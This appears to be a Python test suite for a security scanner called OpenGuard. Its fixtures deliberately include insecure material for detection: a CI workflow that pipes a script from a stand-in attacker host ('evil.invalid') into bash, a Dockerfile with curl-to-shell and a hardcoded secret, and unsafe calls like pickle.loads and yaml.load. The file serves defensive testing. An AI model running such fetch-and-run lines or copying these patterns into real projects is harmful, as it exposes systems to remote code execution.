"""Tests for OpenGuard v1.2.0 upgrades:
- CI/CD Workflow Security Scanner (OpenSSF Scorecard / Zizmor style)
- Dockerfile Security Scanner (Trivy / Hadolint style)
- Modern Lockfile Parsers (uv.lock, poetry.lock, yarn.lock, pnpm-lock.yaml)
- Call-Graph Symbol-Level Reachability + CycloneDX 1.5 VEX + SARIF source_file
- Go SAST rules
- Full-file AST staged diff & --diff incremental scanning + Baseline suppression + PR comment
- Dependency Auto-Upgrade (autofix --deps)
- Built-in JSON-RPC 2.0 MCP Server (openguard mcp)
"""

from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

from openguard.auditor import OpenGuardAuditor
from openguard.baseline import build_baseline, save_baseline
from openguard.config import AuditConfig
from openguard.mcp_server import handle_jsonrpc_request
from openguard.remediation.dep_remediator import DependencyRemediator
from openguard.reporters.markdown_reporter import render_pr_comment
from openguard.reporters.sarif_sbom_reporter import render_cyclonedx, render_sarif
from openguard.scanners.ci_workflow_scanner import CIWorkflowScanner
from openguard.scanners.code_security_scanner import CodeSecurityScanner
from openguard.scanners.dependency_parser import DependencyParser
from openguard.scanners.dockerfile_scanner import DockerfileScanner


class TestCIWorkflowAndDockerfileScanners(unittest.TestCase):
    def test_ci_workflow_scanner_catches_unpinned_prt_injection_and_permissions(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            wf_dir = root / ".github" / "workflows"
            wf_dir.mkdir(parents=True)
            (wf_dir / "bad.yml").write_text(
                "name: Bad CI\n"
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "        with:\n"
                "          ref: ${{ github.event.pull_request.head.sha }}\n"
                "      - run: echo \"${{ github.event.issue.title }}\"\n"
                "      - run: curl -fsSL http://evil.invalid/i.sh | bash\n",
                encoding="utf-8",
            )
            hits = CIWorkflowScanner().scan_repository(root)
            rule_ids = {h.rule_id for h in hits}
            self.assertIn("OG-CI-001", rule_ids)  # unpinned action
            self.assertIn("OG-CI-002", rule_ids)  # missing permissions
            self.assertIn("OG-CI-003", rule_ids)  # pull_request_target + PR head checkout
            self.assertIn("OG-CI-004", rule_ids)  # expression injection
            self.assertIn("OG-CI-005", rule_ids)  # curl | bash

    def test_own_github_workflow_passes_ci_scanner_cleanly(self) -> None:
        repo_root = Path(__file__).resolve().parents[1]
        hits = CIWorkflowScanner().scan_repository(repo_root)
        self.assertEqual(hits, [], f"OpenGuard own CI workflow should be hardened cleanly, got: {hits}")

    def test_dockerfile_scanner_detects_latest_root_secret_and_pipe(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "Dockerfile").write_text(
                "FROM python:latest\n"
                "ENV API_SECRET=sk_live_982341289347128934\n"
                "ADD https://example.com/app.tar.gz /app/\n"
                "RUN curl -sSL https://example.com/install.sh | sh\n",
                encoding="utf-8",
            )
            hits = DockerfileScanner().scan_repository(root)
            rule_ids = {h.rule_id for h in hits}
            self.assertEqual(rule_ids, {"OG-DOCKER-001", "OG-DOCKER-002", "OG-DOCKER-003", "OG-DOCKER-004", "OG-DOCKER-005"})

    def test_go_sast_rules_detect_tls_exec_and_md5(self) -> None:
        go_code = (
            'package main\n'
            'import (\n'
            '\t"crypto/md5"\n'
            '\t"crypto/tls"\n'
            '\t"os/exec"\n'
            ')\n'
            'func main() {\n'
            '\t_ = &tls.Config{InsecureSkipVerify: true}\n'
            '\t_ = exec.Command("sh", "-c", "ls")\n'
            '\t_ = md5.New()\n'
            '}\n'
        )
        hits = CodeSecurityScanner(AuditConfig()).scan_content(go_code, "main.go")
        ids = {h.rule_id for h in hits}
        self.assertEqual(ids, {"OG-SAST-GO-001", "OG-SAST-GO-002", "OG-SAST-GO-003"})


class TestModernLockfilesAndCallGraphVEX(unittest.TestCase):
    def test_parses_uv_poetry_yarn_and_pnpm_lockfiles(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "uv.lock").write_text(
                'version = 1\n'
                '[[package]]\nname = "pyyaml"\nversion = "5.3.1"\ndependencies = [{ name = "urllib3" }]\n',
                encoding="utf-8",
            )
            (root / "poetry.lock").write_text(
                '[[package]]\nname = "flask"\nversion = "2.2.0"\n[package.dependencies]\nwerkzeug = "^2.2"\n',
                encoding="utf-8",
            )
            (root / "yarn.lock").write_text(
                '"lodash@^4.17.15":\n  version "4.17.19"\n',
                encoding="utf-8",
            )
            (root / "pnpm-lock.yaml").write_text(
                "lockfileVersion: '9.0'\n"
                "packages:\n"
                "  'axios@1.5.0':\n"
                "    resolution: {integrity: sha512-abc}\n",
                encoding="utf-8",
            )
            comps, edges, _ = DependencyParser().parse_repository(root)
            by_name = {c.name.lower(): c for c in comps}
            self.assertEqual(by_name["pyyaml"].version, "5.3.1")
            self.assertEqual(by_name["flask"].version, "2.2.0")
            self.assertEqual(by_name["lodash"].version, "4.17.19")
            self.assertEqual(by_name["axios"].version, "1.5.0")
            self.assertIn(("pyyaml", "urllib3"), edges)

    def test_call_graph_reachability_distinguishes_safe_load_vs_unsafe_load_and_emits_vex(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            # Repo 1: calls yaml.load() -> call_reachable -> VEX exploitable
            r1 = Path(tmp) / "unsafe_app"
            r1.mkdir()
            (r1 / "requirements.txt").write_text("PyYAML==5.3.1\nfastapi==0.100.0\n", encoding="utf-8")
            (r1 / "app.py").write_text("import yaml as y\ndata = y.load('a: 1')\n", encoding="utf-8")

            rep1 = OpenGuardAuditor(AuditConfig(offline=True)).audit(r1)
            by_pkg1 = {v.component_name: v for v in rep1.vulnerabilities}
            self.assertEqual(by_pkg1["PyYAML"].reachability_level, "call_reachable")
            self.assertTrue(any("app.py:2" in loc for loc in by_pkg1["PyYAML"].call_locations))
            self.assertEqual(by_pkg1["fastapi"].reachability_level, "unreachable")

            cdx1 = render_cyclonedx(rep1)
            vex_by_id = {v["id"]: v.get("analysis", {}) for v in cdx1["vulnerabilities"]}
            self.assertEqual(vex_by_id["CVE-2020-14343"].get("state"), "exploitable")
            self.assertEqual(vex_by_id["CVE-2024-24762"].get("state"), "not_affected")
            self.assertEqual(vex_by_id["CVE-2024-24762"].get("justification"), "code_not_reachable")

            # SARIF should point to requirements.txt instead of hardcoded 'dependencies'
            sarif1 = render_sarif(rep1)
            vuln_uris = {
                r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
                for r in sarif1["runs"][0]["results"]
                if r["ruleId"].startswith("CVE-")
            }
            self.assertIn("requirements.txt", vuln_uris)

            # Repo 2: imports yaml, ONLY calls yaml.safe_load -> import_only -> VEX in_triage
            r2 = Path(tmp) / "safe_app"
            r2.mkdir()
            (r2 / "requirements.txt").write_text("PyYAML==5.3.1\n", encoding="utf-8")
            (r2 / "app.py").write_text("import yaml\ndata = yaml.safe_load('a: 1')\n", encoding="utf-8")
            rep2 = OpenGuardAuditor(AuditConfig(offline=True)).audit(r2)
            by_pkg2 = {v.component_name: v for v in rep2.vulnerabilities}
            self.assertEqual(by_pkg2["PyYAML"].reachability_level, "import_only")
            self.assertEqual(by_pkg2["PyYAML"].call_locations, [])


class TestBaselineDiffDepAutofixAndMCP(unittest.TestCase):
    def test_baseline_suppresses_preexisting_findings(self) -> None:
        demo_src = Path(__file__).resolve().parents[1] / "examples" / "vulnerable_demo_repo"
        with tempfile.TemporaryDirectory() as tmp:
            work = Path(tmp) / "repo"
            shutil.copytree(demo_src, work)
            base_report = OpenGuardAuditor(AuditConfig(offline=True)).audit(work)
            self.assertGreater(len(base_report.secrets), 0)

            bfile = save_baseline(base_report, work / ".openguard-baseline.json")
            self.assertGreater(len(build_baseline(base_report)["fingerprints"]), 0)

            after = OpenGuardAuditor(AuditConfig(offline=True, baseline_path=str(bfile))).audit(work)
            self.assertEqual(len(after.secrets), 0)
            self.assertEqual(len(after.vulnerabilities), 0)
            self.assertGreater(after.baseline_suppressed_count, 0)

            pr_md = render_pr_comment(after)
            self.assertIn("openguard-pr-comment", pr_md)
            self.assertIn("Baseline Suppressed", pr_md)

    def test_diff_aware_scan_reports_only_newly_introduced_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp) / "diff_repo"
            repo.mkdir()
            subprocess.run(["git", "init"], cwd=repo, check=True, capture_output=True)
            subprocess.run(["git", "config", "user.name", "Tester"], cwd=repo, check=True)
            subprocess.run(["git", "config", "user.email", "t@example.com"], cwd=repo, check=True)

            # Commit 1: pre-existing eval()
            (repo / "legacy.py").write_text("x = eval('1+1')\n", encoding="utf-8")
            subprocess.run(["git", "add", "."], cwd=repo, check=True)
            subprocess.run(["git", "commit", "-m", "init"], cwd=repo, check=True, capture_output=True)

            # Commit 2: newly introduced unsafe pickle.loads() + docstring placeholder (AST should suppress docstring!)
            (repo / "feature.py").write_text(
                '"""Example token AKIAIOSFODNN7EXAMPLE in docstring."""\n'
                "import pickle\n"
                "def f(b):\n"
                "    return pickle.loads(b)\n",
                encoding="utf-8",
            )
            subprocess.run(["git", "add", "."], cwd=repo, check=True)
            subprocess.run(["git", "commit", "-m", "feat"], cwd=repo, check=True, capture_output=True)

            rep = OpenGuardAuditor(AuditConfig(offline=True, diff_ref="HEAD~1")).audit(repo)
            sast_files = {c.file_path for c in rep.code_security_findings}
            self.assertIn("feature.py", sast_files)
            self.assertNotIn("legacy.py", sast_files)
            # Docstring example token must stay suppressed via full-file AST context
            self.assertEqual(len(rep.secrets), 0)

    def test_dep_remediator_upgrades_requirements_and_package_json(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "requirements.txt").write_text("PyYAML==5.3.1\nrequests==2.28.0\n", encoding="utf-8")
            (root / "package.json").write_text(
                json.dumps({"name": "demo", "dependencies": {"lodash": "^4.17.15"}}),
                encoding="utf-8",
            )
            report = OpenGuardAuditor(AuditConfig(offline=True)).audit(root)
            res = DependencyRemediator().remediate(root, report, apply=True)
            self.assertEqual(res.files_modified, 2)
            self.assertGreaterEqual(res.packages_upgraded, 3)
            self.assertIn("PyYAML==5.4.1", (root / "requirements.txt").read_text(encoding="utf-8"))
            pkg_after = json.loads((root / "package.json").read_text(encoding="utf-8"))
            self.assertEqual(pkg_after["dependencies"]["lodash"], "^4.17.21")

    def test_mcp_server_jsonrpc_initialize_list_and_tools(self) -> None:
        init_resp = handle_jsonrpc_request({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
        assert init_resp is not None
        self.assertEqual(init_resp["result"]["serverInfo"]["name"], "openguard-mcp")

        list_resp = handle_jsonrpc_request({"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}})
        assert list_resp is not None
        tool_names = {t["name"] for t in list_resp["result"]["tools"]}
        self.assertEqual(
            tool_names,
            {"audit_repository", "audit_code_snippet", "check_package_safety", "generate_pr_comment"},
        )

        # check_package_safety catches typosquatting & slopsquatting
        typo_resp = handle_jsonrpc_request(
            {
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tools/call",
                "params": {"name": "check_package_safety", "arguments": {"package_name": "reqeusts", "ecosystem": "PyPI"}},
            }
        )
        assert typo_resp is not None
        typo_data = json.loads(typo_resp["result"]["content"][0]["text"])
        self.assertEqual(typo_data["risk_level"], "BLOCK")

        slop_resp = handle_jsonrpc_request(
            {
                "jsonrpc": "2.0",
                "id": 4,
                "method": "tools/call",
                "params": {"name": "check_package_safety", "arguments": {"package_name": "python-utils", "ecosystem": "PyPI"}},
            }
        )
        assert slop_resp is not None
        slop_data = json.loads(slop_resp["result"]["content"][0]["text"])
        self.assertEqual(slop_data["risk_level"], "WARN")
        self.assertIsNotNone(slop_data["slopsquatting_warning"])

        # audit_code_snippet via MCP
        snip_resp = handle_jsonrpc_request(
            {
                "jsonrpc": "2.0",
                "id": 5,
                "method": "tools/call",
                "params": {
                    "name": "audit_code_snippet",
                    "arguments": {"code": "import pickle\npickle.loads(data)\n", "filename": "a.py"},
                },
            }
        )
        assert snip_resp is not None
        snip_data = json.loads(snip_resp["result"]["content"][0]["text"])
        self.assertFalse(snip_data["safe"])


if __name__ == "__main__":
    unittest.main()
